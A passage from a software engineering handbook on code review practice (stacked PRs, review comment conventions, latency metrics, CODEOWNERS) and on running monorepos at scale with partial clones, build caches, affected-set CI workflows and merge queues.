The usual objection is that some changes are irreducibly large. Very few are. What is true is that a coherent change often has three or four stages, and a single branch flattens them into one diff. A stack keeps them separate: each branch targets the previous one, each PR is independently readable, and the reviewer sees the refactor before the behaviour change rather than tangled with it.

a stack of three PRs, each reviewable on its own * 4e2b1c7 origin/main * a91f0c2 feat/limiter/1-clock PR #4821 base: main +82 -61 mechanical: extract a Clock interface | * 7d3ba50 feat/limiter/2-bucket PR #4822 base: 1-clock +140 -4 behaviour: the token bucket itself | * c02e1f9 feat/limiter/3-wire PR #4823 base: 2-bucket +37 -12 wiring: call it behind a flag merge order is bottom-up; GitHub retargets #4822 to main when #4821 merges

The three rules that make stacks work in practice. Merge from the bottom. GitHub automatically retargets a child PR to main when its base branch merges, but only if you merge rather than delete-and-recreate. Restack, do not merge sideways. When the bottom of the stack changes, rebase the children onto it — git rebase --update-refs (Git 2.38+) moves every branch pointer in the stack in one pass instead of one rebase per branch. Force-push with a lease. Rebasing rewrites the children, so --force-with-lease is mandatory; a bare --force will silently discard a collaborator's push.

Separate the mechanical from the behavioural

The single most valuable habit in this chapter: a commit that reformats, renames, moves or regenerates must contain nothing else. Mechanical changes are verifiable by construction — the reviewer runs the same tool and gets the same output, or checks that git diff -w is empty — and they are unreviewable line by line. A behavioural change hidden inside one is invisible.

The reformat that shipped a bug

A 612-line diff on internal/http/router.go, described as "run gofmt over the package". The reviewer skimmed it, saw only whitespace churn, and approved in ninety seconds. Buried in it, one line had changed from if !authz.Allow(u, res) to if authz.Allow(u, res) — a stray edit from an earlier debugging session that the author never noticed. It was in production for six days before an audit caught it. Nothing in the process was unusual, and that is the point: a large mechanical diff is a place to hide a logic change, whether or not anyone intends to hide one. The defence is cheap. Run git diff -w --stat before requesting review: if the whitespace-insensitive diff is not empty on a file you only reformatted, split it. If you have already merged one, git log -S 'authz.Allow' --oneline -- internal/http/router.go finds the commit that changed the string, and git revert of the mechanical commit is safe precisely because it was mechanical. Record the formatting commit in .git-blame-ignore-revs so it does not poison git blame forever.

Shaping a change into something reviewable
CommandWhat it doesNotes
git diff --stat origin/main...HEADSize of your change against the merge basesafe three dots — two dots compares tips and lies after a rebase
git diff -w --stat origin/main...HEADSame, ignoring whitespacesafe the gap between the two is your mechanical noise
git switch -c feat/x-2 feat/x-1Starts the next PR in a stack on the previous onesafe then gh pr create --base feat/x-1
git rebase --update-refs origin/mainRestacks the whole chain, moving every branch refcare Git 2.38+; set rebase.updateRefs=true to make it the default
git push --force-with-leasePublishes a rewritten branch, refusing if the remote movedcare recover an overwritten tip from the pusher's local reflog
git commit --fixup=7d3ba50Records a review fix aimed at a specific commitsafe keeps the stack's shape while addressing comments
git rebase -i --autosquash origin/mainFolds every fixup into its targetcare do this after approval, not during review
git add -pStages selected hunks, splitting a tangled editsafe the tool for separating a refactor you did by accident
gofmt -l ./... / ruff format --check .Lists files the formatter would changesafe run it in its own commit, on its own branch

Writing a pull request someone can review

A reviewer arrives with no context and a finite budget of attention. Everything you spend for them, they do not have to spend on the code. The description is not paperwork; it is the difference between a reviewer who evaluates your approach and one who reverse-engineers it.

  1. State the problem, not the patch. One paragraph: what is wrong or missing today, with a link to the ticket, incident or metric. A reviewer who does not know what problem you are solving cannot tell you that you are solving the wrong one.
  2. State the approach in three sentences. Enough that the reviewer can predict what the diff contains before opening it. Surprises in a diff are expensive; surprises the description warned about are not.
  3. Name what you considered and rejected. "I considered doing this in the database with a partial index, but the write path already holds the lock." This is the highest-value paragraph in any PR: it pre-empts the reviewer's first suggestion and becomes the design record.
  4. Say how you tested it. Not "added tests" — which tests, and what manual or load verification you ran. A terminal transcript or a screenshot for anything with a user-visible surface. If you did not test something, say which thing.
  5. Declare the risk and the rollback. Migration, feature flag, config change, backfill, cache invalidation, anything touching money or auth. What happens if this is wrong at 03:00, and what the on-call engineer does about it.
  6. Self-review first. Open your own diff in the web UI — not your editor — and read it as a stranger. You will find the debug print, the commented-out block, the accidentally committed fixture, and the file you did not mean to touch. This costs five minutes and removes the majority of the comments you would otherwise receive.
the self-review pass, before anyone else is asked
$ git diff --stat origin/main...HEAD
 internal/limiter/bucket.go   | 140 ++++++++++++++++++
 internal/limiter/clock.go    |  24 ++++++
 internal/http/handler.go     |  37 ++++++-----
 internal/http/router.go      | 612 +++++++++++++++++++-------------------
 4 files changed, 693 insertions(+), 120 deletions(-)

$ git diff -w --stat origin/main...HEAD -- internal/http/router.go
 internal/http/router.go      |   3 +--
# 612 lines of diff, 3 lines of actual change. The rest is the formatter.

$ git diff origin/main...HEAD | grep '^+' | grep -nEi 'fmt.Print|console.log|TODO|XXX|localhost'
7:+      fmt.Printf("bucket=%v tokens=%d", b, b.tokens)
19:+     // TODO: handle clock skew -- fine for now?

$ git diff --name-only origin/main...HEAD | grep -vE '^(internal|cmd)/'
(no output — nothing stray outside the intended tree)

$ gh pr create --base main --draft --title "limiter: per-tenant token bucket" --body-file .github/pr-body.md
https://github.com/acme/api/pull/4822

$ gh pr ready 4822
Pull request #4822 is marked as ready for review

Two details in that transcript are worth stealing. The formatter noise on router.go gets moved to its own branch before review — the whole PR drops from 693 changed lines to 81. And the PR is opened as a draft, so CI runs and the author reads the rendered diff before any reviewer is notified; gh pr ready is the moment the clock starts.

Reviewing well

The failure mode of an inexperienced reviewer is treating every observation as equally binding. The failure mode of an experienced one is silence. Both are fixed by being explicit about the weight of each comment, which is why prefix conventions work so well: a comment that begins blocking:, suggestion:, question:, nit: or praise: tells the author exactly what to do with it, and stops a stylistic preference from reading like a merge veto.

What to block on, what to suggest, and what nobody should be typing
CategoryWeightHow it reads
Incorrect behaviour, unhandled error path, race, off-by-oneBlock"blocking: if the context is cancelled here we return nil and the caller treats it as success — is that intended?"
Security: missing authorisation, injection, secret in source, SSRFBlock"blocking: this interpolates tenantID into the query string; can it be a bind parameter?"
Irreversible data change: destructive migration, backfill without a dry runBlock"blocking: dropping the column in the same deploy that stops writing it leaves no rollback. Two-phase?"
Public API, event schema, or database schema shapeBlockCheap now, permanent later. Worth a synchronous conversation.
Missing test for the specific bug being fixedBlock (usually)A fix with no failing-first test will regress.
Simpler structure, better name, duplicated logicSuggest"suggestion (non-blocking): this is the third place we parse this header — extract it in a follow-up?"
Performance, without a measurementQuestion"question: this is O(n²) over the tenant list — how large does that get in production?"
Formatting, import order, line length, quote styleNeitherThe formatter decides. If it is arguable, the formatter is misconfigured.
Personal idiom preferencenit, explicitly optional"nit: I'd use a switch here, entirely up to you."

Three habits separate reviewers people want from reviewers people avoid. Comment on the code, not the person — "this function mutates its argument" rather than "you mutated the argument"; the grammatical difference is small and the effect on the thread is not. Ask rather than pronounce. "What happens if this retries after a partial write?" invites the author to reason; "this is wrong" invites them to defend. Half the time the question reveals that the author already handled it and you misread the diff. Approve when it is better than what exists. The comparison is never against an ideal implementation, it is against main as it stands. "Approve with comments" — approving while leaving non-blocking suggestions — is the single most useful button in the interface, and the most underused: it unblocks the author, keeps your feedback visible, and trusts them to apply judgement.

Interview

"A colleague opens a 2,300-line pull request the day before a release. What do you do?" The answer that fails is "review it carefully". The answer that lands names the trade-off out loud: ask what actually has to ship for the release, review that part properly, and get the rest split. Then say what you would block on even under time pressure — correctness on the release path, security, anything irreversible — and what you would explicitly waive to a follow-up ticket, in writing, on the PR. Interviewers are listening for two things: that you know review quality collapses at that size rather than merely degrading, and that you will make an explicit, recorded risk decision instead of rubber-stamping and hoping. A senior candidate also mentions the loop: this PR is 2,300 lines because the last one sat for four days.

Reviewing someone else's change from the terminal
CommandWhat it doesNotes
gh pr list --search "review-requested:@me sort:created-asc"Your queue, oldest firstsafe oldest-first is what keeps p90 latency down
gh pr checkout 4822Fetches the branch locally so you can run itsafe the only way to review anything non-trivial
gh pr diff 4822 --patchThe full patch in your pagersafe pipe to delta or diff-so-fancy
git range-diff origin/main...@{u} origin/main...HEADDiff of two versions of the same seriessafe answers "what changed since I last looked" after a force-push
git log --oneline --no-merges origin/main..HEADThe commits, in order, as the author structured themsafe review commit by commit when the author bothered to split
git blame --ignore-revs-file .git-blame-ignore-revs -L 40,60 file.goBlame that skips recorded reformat commitssafe Git 2.23+; set blame.ignoreRevsFile once, repo-wide
gh pr review 4822 --approve --body "..."Approves, optionally with non-blocking notessafe prefer this to withholding approval over a nit
gh pr review 4822 --request-changesBlocks the merge until re-reviewcare reserve for the blocking rows above; it stops the pipeline
gh pr merge 4822 --squash --delete-branchMerges once checks and approvals passcare squash discards the author's commit structure
gh pr merge 4822 --adminMerges bypassing required checks and reviewsdestructive logged in the audit log; needs an incident number, not a bad mood

Latency is a first-class metric

Measure review the way you measure a service. The numbers below are the ones that change behaviour when a team looks at them weekly; nothing here needs a vendor, since the GitHub API exposes all of it.

Time to first review
Ready-for-review to the first substantive comment or approval. Target a p90 under four working hours. This is the number that determines whether authors context-switch or wait, and it drives everything downstream.
Review latency
Ready-for-review to merge. Watch p90, not the median — the median is fine on almost every team, and the tail is where the pain is.
Rounds
Distinct review cycles before approval. Above two, the cause is nearly always an unclear description or a PR that mixes concerns, not a picky reviewer.
Size distribution
p50 and p90 changed lines, excluding lockfiles and generated code. If p90 is above 400, no amount of reviewer discipline will save you.
Approval concentration
Share of approvals given by the top reviewer per directory. Above 60% and review is not distributing knowledge, it is a bottleneck with a person's name on it.
Change failure rate
Reverts and hotfixes per merged PR. The only outcome measure. If it does not move when review practice changes, the practice was theatre.

The arithmetic that convinces a sceptical manager: a PR waiting a day does not cost a day. It costs the author's context, the rebase against a moved main, the branch they started in the meantime that now depends on unmerged work, and the reviewer's time re-reading a diff they half-read yesterday. In queueing terms, review is a server with a utilisation problem — and the fix is smaller jobs and a shorter queue, not a faster server.

01 · Draft
Open earlyCI runs, no reviewer notified
02 · Machines
Format, lint, typesnothing human until these pass
03 · Self-review
Read your own diffin the web UI, as a stranger
04 · Ready
Request reviewCODEOWNERS routes it; clock starts
05 · Rounds
Comments, fixupsrange-diff shows what changed
06 · Approve
Better than mainnot better than perfect
07 · Merge
Squash or rebasebranch protection enforces the rest

Automation removes review work

Every class of comment that a tool can produce should be produced by a tool, in CI, before a human is asked. This is not about replacing reviewers; it is about spending their attention on the things only they can do. The rule of thumb: if two competent engineers could disagree about it and the answer does not affect behaviour, a tool should decide and nobody should discuss it again.

  • Formatter, non-negotiable and unconfigurable. gofmt, ruff format, prettier, rustfmt. Enforce in CI, run in a pre-commit hook, and land the one-off reformat as its own commit recorded in .git-blame-ignore-revs.
  • Linter for real defect classes, not style: golangci-lint, ruff check, eslint with the rules that catch unhandled promises and shadowed errors. Fail the build; a warning nobody must fix is a warning nobody reads.
  • Type checker in strict mode. mypy --strict, tsc --noEmit. Whole categories of review comment disappear.
  • Coverage as a diff gate, never a global target. "New and changed lines must be covered" is actionable; "the repository must stay at 84%" produces tests written to game a number.
  • Dependency and licence checks. Dependabot or Renovate for updates, pip-audit / npm audit / govulncheck for known vulnerabilities, and an allowlist of acceptable licences — no reviewer reliably notices that a transitive dependency arrived under AGPL.
  • Secret scanning on push, with push protection enabled. A reviewer catching a key in a diff is a lucky reviewer; assume the unlucky case.
  • CODEOWNERS for routing. The difference between "someone will look at this" and a named team with a notification.
plaintext · .github/CODEOWNERS
# Unlike .gitignore, the LAST matching pattern wins. Order from general to specific.
# Owners need write access; the file must live in .github/, docs/ or the repo root
# on the default branch, or it is silently ignored.

*                                @acme/platform

/services/billing/               @acme/payments @acme/platform
/services/billing/migrations/    @acme/dba          # schema changes need a DBA
/services/search/                @acme/search

/infra/                          @acme/sre
/infra/prod/                     @acme/sre-oncall   # production topology
*.tf                             @acme/sre

/docs/                           @acme/docs
/vendor/                                            # no owner: clears the default above
Where CODEOWNERS quietly fails

CODEOWNERS only requires an owner's approval if branch protection has "Require review from Code Owners" ticked; without it the file merely suggests reviewers, and teams routinely believe they have a control they do not have. Three more traps. A syntax error, an unknown team, or an owner without write access makes that line inert — GitHub shows the error in the branch settings UI and nowhere near the PR. Repository administrators can merge past the requirement unless "Do not allow bypassing the above settings" is also enabled, so the audit log is the only place a bypass is visible. And an owning team with nobody available is worse than no owner at all: it converts a routing hint into a hard block, so pair every entry with a rotation and an explicit escalation path. Verify the file with gh api repos/acme/api/codeowners/errors in CI on every change to it.

Disagreement, escalation and distributed teams

Most review conflict is two people optimising for different things and neither saying so. The convention that resolves it fastest: two rounds, then talk. If a thread reaches a third exchange, it has stopped being a review comment and become a design discussion — move it to a fifteen-minute call, a design doc, or an ADR, and post the outcome back on the PR so the record survives. Text is a poor medium for disagreement and an excellent one for recording a decision.

When it does not resolve, escalate on the axis of consequence, not seniority. Reversible and cheap: the author decides, ship it, revisit with data. Reversible but expensive: the owning team decides. Irreversible — public API, schema, data migration, security posture — it needs an explicit owner's decision, written down, before merge. "Disagree and commit" is a legitimate and honourable outcome, provided the disagreement is recorded so that whoever is paged later can see it was considered.

Across time zones, the constraint is round trips. One round trip costs a working day when the reviewer is eight hours away, so a three-round review is a week. That changes the economics of everything above: descriptions must be complete enough to review without asking, comments must be batched into a single submitted review rather than dribbled out one at a time, and every comment must carry its weight so the author knows what to act on before the reviewer wakes up. Two norms are worth writing into the team's handbook. First, anyone may approve outside their zone — a follow-up ticket beats a day of latency. Second, a blocking comment must contain a proposal: "this is not right" costs a day and delivers nothing. Where a genuine debate is unavoidable, spend the synchronous slot on it rather than a fourth asynchronous round.

The reviewer's checklist

Short enough to actually run, in this order — because if the first two fail, nothing else matters.

  1. Do I understand what problem this solves, and is this the right problem?
  2. Is the approach sound, or is there a materially simpler one? (Say it now; it is unsayable after merge.)
  3. Correctness on the unhappy path: errors, timeouts, cancellation, retries, empty and maximal inputs, concurrency.
  4. Security: authorisation on every new path, parameterised queries, no secrets, no untrusted input reaching a shell or a URL.
  5. Data: is any change irreversible? Is the migration two-phase and does it roll back?
  6. Interfaces: does this add a public API, event or schema field we will be unable to remove?
  7. Tests: does one of them fail without the change? Is the new behaviour covered rather than merely executed?
  8. Operability: logs, metrics, feature flag, and a stated rollback for the on-call engineer.
  9. Everything else — naming, structure, style — is a suggestion, a nit, or the formatter's job. Label it as such and approve.
G12

Monorepos at scale

A monorepo is two systems pretending to be one: a version control repository that holds every project, and a build system that understands the repository as a graph of projects rather than as a single program. Teams that adopt the first half without the second discover that every commit runs every test, and conclude the model does not work — when what failed was the missing half.

The model before the tooling

The defining property of a monorepo is not directory layout. It is that every project in the repository is consistent at every commit: one source tree, one history, one version of every shared dependency at HEAD. Everything else — the caches, the affected-set calculation, the merge queue — exists to make that property affordable.

Two distinctions kill most of the confusion in this area before it starts.

Monorepo vs monolith
Orthogonal. A monorepo is a source-control topology; a monolith is a deployment topology. Google runs one repository and tens of thousands of separately deployed binaries. You can equally run a single deployable monolith split across nine repositories, and many do, badly.
Project graph
The directed graph of packages/targets in the repository and their dependencies, derived from manifests (package.json, go.mod) or from explicit build files (BUILD.bazel).
Affected set
Given a diff, the set of projects that changed plus everything transitively downstream of them. This is what CI should build and test — not the repository.
Task graph
The project graph expanded into individual units of work (lint, build, test) with ordering constraints, so the scheduler can run what is independent in parallel.
Hermetic task
A task whose output is a pure function of its declared inputs. Only hermetic tasks can be safely cached, and cache correctness is entirely a function of how honestly inputs are declared.

An atomic commit is also not an atomic deploy. A monorepo lets you change a producer and every consumer in one reviewable change; it does not let you land that change on running services simultaneously. Rolling deploys still require the expand/contract discipline covered in the chapter on release strategies. Engineers who forget this ship a wire-format change and a consumer change in one commit and take an outage during the rollout window.

The case for

  • Atomic cross-project change. A breaking change to a shared library plus its nine call sites is one commit, one review, one revert. In a polyrepo the same change is a version bump propagated through nine pull requests over several days, during which main of each repository holds a different opinion about the contract.
  • One version of everything. The diamond dependency problem — service A needs grpc 1.60, library B pins 1.48 — does not exist at HEAD, because there is only one HEAD. Security patching becomes one pull request rather than an inventory exercise.
  • Shared tooling. One formatter config, one lint ruleset, one CI template, one release pipeline. The marginal cost of the tenth service approaches zero, which is the actual argument for the model.
  • Refactoring across boundaries. Rename an interface and fix every caller in the same change, with the type checker and the test suite proving you found them all. In a polyrepo you cannot reliably enumerate the callers, let alone fix them.
  • Visible reuse. One code search over one tree. Duplicate implementations of the same retry helper are discoverable, and therefore deletable.

The case against

  • CI cost is the first wall. Naive CI is O(repository) per commit instead of O(change). At 400 packages this is not a slow pipeline, it is an unusable one.
  • Tooling investment is permanent. Someone must own the build graph, the cache and the queue. A monorepo without a named owner degrades faster than a set of small repos, because nobody is responsible for the shared parts.
  • Access control is repository-granular. This is the hard constraint. Git permissions on GitHub, GitLab and Bitbucket are per-repository; there is no supported way to hide a directory from a user who can clone. CODEOWNERS is a review requirement, not an access control. Code that contractors, or most employees, must not read belongs in a separate repository — full stop.
  • Repository size is everyone's problem. One team committing generated protobufs or a 300 MB fixture slows every clone in the company, forever. GitHub hard-rejects any file over 100 MB, warns above 50 MB, and caps a single push at 2 GB.
  • Shared blast radius. A broken root tsconfig.base.json, a bad lockfile, or an expired cache credential stops every team at once.

What actually breaks, and the fix for each

The failures arrive in a predictable order, and each has a specific remedy. Reach for them in this sequence rather than adopting all of them on day one.

Scaling symptoms in order of appearance
SymptomCauseFix
Clone takes 20+ minutes; CI spends more time fetching than testingEvery blob of every project for all historyPartial clone (--filter=blob:none), --filter=tree:0 for throwaway CI checkouts
git checkout and branch switches crawl; the editor indexes 900k filesThe whole working tree is materialised on diskSparse checkout in cone mode; parallel checkout workers
git status takes 8 seconds; git log -- path takes minutesFull tree lstat() scan; no commit-graph; no Bloom filterscore.fsmonitor, untracked cache, index v4, commit-graph with changed paths, multi-pack index
Every commit runs the entire test suiteNo project graph, so no affected setAffected-project detection plus remote build caching
main is red several times a day despite every PR being greenSemantic conflicts between concurrently merged PRsA merge queue with speculative batching
Git-side configuration for a large repository
CommandWhat it doesNotes
git clone --filter=blob:none --sparse URLBlobless clone: commits and trees arrive, file contents on demandsafe Git 2.25+; merge-base, log and blame still work (blame refetches)
git clone --filter=tree:0 --depth=1 URLTreeless, shallow — the smallest possible CI checkoutcare history traversal is crippled; never use where you need merge-base
git sparse-checkout set --cone apps/web libs/uiMaterialises only those directory cones plus root filescare paths outside vanish from disk but remain in HEAD
git sparse-checkout add services/billingWidens the cone, fetching the missing blobssafe requires network in a partial clone
git sparse-checkout reapplyRe-applies patterns after a merge materialised stray directoriessafe first thing to try when the tree looks wrong
git config core.fsmonitor trueBuilt-in filesystem monitor daemon; status stops scanning the treesafe Git 2.37+ on macOS and Windows; Linux via Watchman hook
git config core.untrackedCache trueCaches per-directory untracked-file resultssafe verify support with git update-index --test-untracked-cache
git config feature.manyFiles trueUmbrella: index v4, untracked cache, index.skipHashcare index.skipHash (2.40+) produces an index older Git and JGit refuse to read
git commit-graph write --reachable --changed-pathsBuilds the commit-graph with changed-path Bloom filterssafe turns git log -- path from minutes into milliseconds
git multi-pack-index write --bitmapOne index and reachability bitmap across all packssafe Git 2.34+; large win on fetch negotiation
git config checkout.workers 0Parallel checkout, one worker per logical coresafe Git 2.32+; measurable only on very wide checkouts
git maintenance startSchedules prefetch, commit-graph, loose-object and incremental repack jobssafe the reason a well-tended clone stays fast
scalar clone URLOpinionated large-repo clone: partial, sparse cone, maintenance enabledsafe ships with Git 2.38+; the sane default for onboarding
git sparse-checkout disableRestores the full working treecare may download tens of gigabytes
onboarding into a 900k-file monorepo
$ git clone --filter=blob:none --sparse git@github.com:acme/platform.git
Cloning into 'platform'...
remote: Enumerating objects: 1841203, done.
remote: Total 1841203 (delta 0), reused 0 (delta 0), pack-reused 1841203
Receiving objects: 100% (1841203/1841203), 412.88 MiB | 24.10 MiB/s, done.
# 412 MiB, not the 9.1 GiB a full clone transfers.

$ cd platform && git sparse-checkout set --cone apps/web libs/ui libs/http
$ git ls-files | wc -l          # in the index
  914233
$ find . -path ./.git -prune -o -type f -print | wc -l   # on disk
   11907

$ time git status
On branch main
nothing to commit, working tree clean
git status  4.61s user 2.30s system 98% cpu 7.012 total

$ git config core.fsmonitor true && git config core.untrackedCache true
$ git config feature.manyFiles true
$ git commit-graph write --reachable --changed-paths
$ git status >/dev/null && time git status
nothing to commit, working tree clean
git status  0.09s user 0.06s system 91% cpu 0.163 total

$ git maintenance start
Scheduled: prefetch hourly, commit-graph hourly, incremental-repack daily.
Measure before you configure

GIT_TRACE2_PERF=1 git status prints per-phase timings and tells you whether you are paying for the untracked scan, the index read or the refresh. Two of the settings above are also worth pushing to everyone via .gitconfig management rather than a wiki page: core.fsmonitor and maintenance. A monorepo where half the engineers have the fast configuration and half do not generates a steady stream of "Git is slow" tickets that nobody can reproduce.

The build tooling landscape

Every tool in this space provides some subset of four things: a project/task graph, content-addressed caching keyed on declared inputs, remote caching so a colleague's or CI's result is reused, and remote execution so tasks run on a fleet rather than a laptop. The price of the higher tiers is how much of your build you must re-describe in the tool's own language.

What each tool actually buys you
ToolScopeGraph comes fromCachingAdoption cost
TurborepoJS/TS workspacesPackage manager workspaces + turbo.jsonLocal and remote, content-addressed on declared inputsHours. Wraps your existing package.json scripts.
NxJS/TS first, plugins for othersInferred from imports and manifests, plus project configLocal, remote, plus distributed task executionDays. Richer graph, generators, migrations; more opinions.
BazelPolyglot, very large reposExplicit BUILD.bazel targets in StarlarkSandboxed and hermetic; remote cache and remote executionQuarters, and usually a dedicated team.
PantsPython first, also Go/JVM/shellDependency inference from source — no hand-written depsSandboxed, remote cache and executionWeeks. Most of Bazel's model without hand-authoring the graph.

Be honest about the top of that table. Bazel-class tooling gives genuine hermeticity, reproducible artefacts and remote execution across thousands of cores — and it asks you to rewrite your build in Starlark, adopt rule sets whose maturity varies sharply by language, keep generated build files in sync (gazelle for Go, rules_python requirements pinning), and staff someone to own it. That trade is correct for a polyglot repository with hours of compute per change. It is the wrong answer for forty TypeScript packages, where Turborepo delivers most of the wall-clock win in an afternoon. Choosing Bazel because a large company uses it, without the compute problem that justified it there, is the single most expensive mistake in this chapter.

Cache poisoning

A remote cache is only as correct as your input declarations. A task that reads something undeclared — the system clock, GIT_SHA, a file outside its inputs glob, a globally installed compiler — produces an artefact that gets stored under a key that does not describe it. The next machine with the same key gets the wrong build and no error, which is far worse than a slow build: it ships. Bazel and Pants prevent this by sandboxing; Nx and Turborepo trust your configuration, so audit it. turbo run build --dry=json and nx show project web --json print exactly which inputs are hashed. Make the root lockfile, the base TypeScript config and the CI workflow files global inputs, so that changing them invalidates everything — and never let a task write into its own source directory.

CI design for a monorepo

Three moving parts: compute the affected set from the diff, fan out a matrix over it, and protect main with a merge queue.

Affected-set computation
CommandWhat it doesNotes
git diff --name-only origin/main...HEADFiles changed since the merge base — the correct diff for a PRsafe three dots; two dots compares tips and reports other people's work
git merge-base origin/main HEADThe base commit every affected calculation hangs offcare fails outright on a shallow or ref-starved CI checkout
nx show projects --affected --base=origin/main --jsonAffected projects plus their dependents, as JSONsafe feed straight into a matrix
nx affected -t lint test build --parallel=4Runs the tasks only for the affected graphsafe add --configuration=ci for CI-specific targets
turbo run test --filter=...[origin/main]Changed packages and everything depending on themcare omitting the leading ... tests changed packages only — a common silent gap
turbo run build --dry=jsonPrints the resolved task graph, hashes and inputs without runningsafe the debugging tool for cache misses
bazel query "rdeps(//..., set(FILES))"Reverse dependencies of the changed filessafe exact, because the graph is explicit
pants --changed-since=origin/main --changed-dependents=transitive testTest the change and everything downstreamsafe inference means no BUILD edits for new imports
The failure that ships untested code

actions/checkout defaults to fetch-depth: 1 and fetches only the merge ref, so origin/main does not exist in the CI clone. git merge-base origin/main HEAD then dies with fatal: ambiguous argument 'origin/main': unknown revision or path not in the working tree. Some tools fall back to comparing against HEAD~1, and that is the dangerous outcome: the affected set comes back empty, every job reports success in eleven seconds, and the pull request merges with nothing tested. Green CI that finished suspiciously fast is a symptom, not a triumph. Fix it explicitly: fetch-depth: 0 combined with filter: blob:none keeps history available without the bytes, and CI should fail loudly — not fall back — when the merge base cannot be resolved.

yaml · .github/workflows/ci.yml
on:
  pull_request:
  merge_group:            # required: the queue tests batches, not your PR branch

concurrency:
  group: ci-${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  affected:
    runs-on: ubuntu-latest
    outputs:
      projects: ${{ steps.set.outputs.projects }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0          # history is needed for merge-base
          filter: blob:none       # ...but not every blob of it
      - uses: pnpm/action-setup@v4
      - run: pnpm install --frozen-lockfile
      - id: set
        run: |
          BASE="${{ github.event.merge_group.base_sha || format('origin/{0}', github.base_ref) }}"
          git merge-base "$BASE" HEAD >/dev/null || { echo "::error::no merge base for $BASE"; exit 1; }
          echo "projects=$(pnpm exec nx show projects --affected --base="$BASE" --json)" >> "$GITHUB_OUTPUT"

  verify:
    needs: affected
    if: needs.affected.outputs.projects != '[]'
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        project: ${{ fromJSON(needs.affected.outputs.projects) }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0, filter: blob:none }
      - uses: pnpm/action-setup@v4
      - run: pnpm install --frozen-lockfile
      - run: pnpm exec nx run ${{ matrix.project }}:test --configuration=ci

  # Required status check. Runs even when `verify` is skipped, so an empty
  # affected set cannot leave the PR blocked on a check that never reports.
  ci:
    if: always()
    needs: [affected, verify]
    runs-on: ubuntu-latest
    steps:
      - run: |
          [ "${{ needs.affected.result }}" = "success" ] || exit 1
          case "${{ needs.verify.result }}" in success|skipped) exit 0 ;; *) exit 1 ;; esac
The required-check deadlock

Do not gate a monorepo with paths: filters on the workflow trigger plus required status checks. A workflow skipped by a path filter reports nothing, and a required check that never reports leaves the pull request permanently blocked on "Expected — waiting for status". Every monorepo hits this in its first month. The pattern above is the fix: always run one cheap aggregating job, name that as the required check, and let it decide.

Why a merge queue stops being optional

Affected sets are computed against a base commit. Two pull requests can each be perfectly green against the same base and still break main when both land, because neither one's diff touched the other's files — a semantic conflict that no three-way merge will flag.

o---o PR #812 renames util.formatDate -> formatIso / green against 4e2b1c7 (affected: libs/util, apps/web) / --*------*--------* main is now red: apps/api calls a symbol that no longer exists 4e2b1c7 \ merge #812, then merge #815 \ o---o PR #815 adds a new call to util.formatDate in apps/api green against 4e2b1c7 (affected: apps/api)

The probability of this scales with merge rate multiplied by CI duration. At two merges an hour and a ten-minute pipeline it is a curiosity; at forty merges an hour it is a daily outage of everybody's development branch. A merge queue removes it by testing the prospective merge result, in order, and only fast-forwarding main when that result is green. GitHub's queue creates gh-readonly-queue/main/pr-812-4e2b1c7 branches and dispatches the merge_group event, which is why the workflow above subscribes to it.

A strictly serial queue caps throughput at one merge per pipeline duration. Batching (test PRs 1–5 together, split the batch on failure) and speculative execution (test batch n+1 assuming n passes) recover most of it. Configure batch size and the "only merge if green" behaviour deliberately: a batch too large bisects slowly on every flake.

01 · Diff
merge-basefail loudly if it cannot resolve
02 · Graph
Affected setchanged projects + transitive dependents
03 · Fan out
Matrixone job per affected project, cache-hit fast path
04 · Gate
Aggregate checkthe one required status
05 · Queue
merge_grouptests the prospective merge, batched
06 · Land
Fast-forward maingreen batch only
Interview · "how do you keep CI under ten minutes in a 400-package repo?"

The answer they are listening for has four layers, in order. One: do less work — compute the affected set from the merge base and run only that, including reverse dependencies. Two: reuse work — a remote content-addressed cache, so an unchanged package is a cache hit measured in seconds, and CI populates the same cache developers read from. Three: parallelise the rest — matrix or distributed task execution across machines. Four: protect the result — a merge queue, because affected sets are computed against a base that moves. Candidates who jump straight to "more runners" have not understood that the cost is O(change) if the graph is right and O(repository) if it is not. The strongest follow-up you can volunteer yourself: cache correctness depends on input declarations, so an undeclared input is a wrong-artefact bug, not a performance bug.

Ownership without repository boundaries

Removing repository boundaries removes the accidental review gate they provided. CODEOWNERS restores it at directory granularity, but only if you understand its semantics.

plaintext · .github/CODEOWNERS
# Last matching pattern wins — the opposite of most people's assumption.
*                           @acme/platform

/libs/http/                 @acme/platform @acme/networking
/apps/web/                  @acme/web
/apps/web/src/checkout/     @acme/payments        # narrower rule, listed later
/services/billing/          @acme/payments

# Cross-cutting files that must not be changed casually.
/pnpm-lock.yaml             @acme/platform
/tsconfig.base.json         @acme/platform
/.github/workflows/         @acme/platform @acme/security
  • Last match wins. Order the file from broad to narrow. A catch-all * placed at the bottom silently owns everything.
  • It only counts on the default branch, and only when branch protection has "Require review from Code Owners" enabled. Without that, it is a suggestion.
  • A team must have write access to the repository to be assignable; teams that do not are dropped silently from the requested reviewers.
  • Syntax errors disable rules. GitHub surfaces them on the file's own view; lint the file in CI rather than trusting anyone to look.
  • Nested per-directory CODEOWNERS files are not supported — only the root, .github/ or docs/. In a large repo, generate the single file from per-project metadata and commit the generated result.

CODEOWNERS routes review. It does not stop a determined engineer from reading, cloning or copying code, and it does not stop cross-boundary imports. For that, add a graph constraint — Nx module boundary tags, ESLint no-restricted-imports, Bazel visibility — and enforce it as a lint failure. Otherwise a monorepo drifts, one convenient import at a time, into a distributed monolith with none of the benefits of either shape.

Versioning and publishing

Two coherent policies, and one incoherent one.

Fixed (lockstep)
Every published package carries the same version; a release bumps them all. Trivial to reason about and to support ("you are on 4.7.x"), at the cost of meaningless version churn for untouched packages. Correct for a design system or an SDK family shipped as a suite.
Independent
Each package versions on its own semver track based on what actually changed. Honest, and what consumers want, at the cost of a matrix of compatible versions to reason about. Correct for a large library estate.
Ad hoc
Hand-edited versions and manual npm publish. This is not a policy; it is a future incident in which two packages were published from different commits.

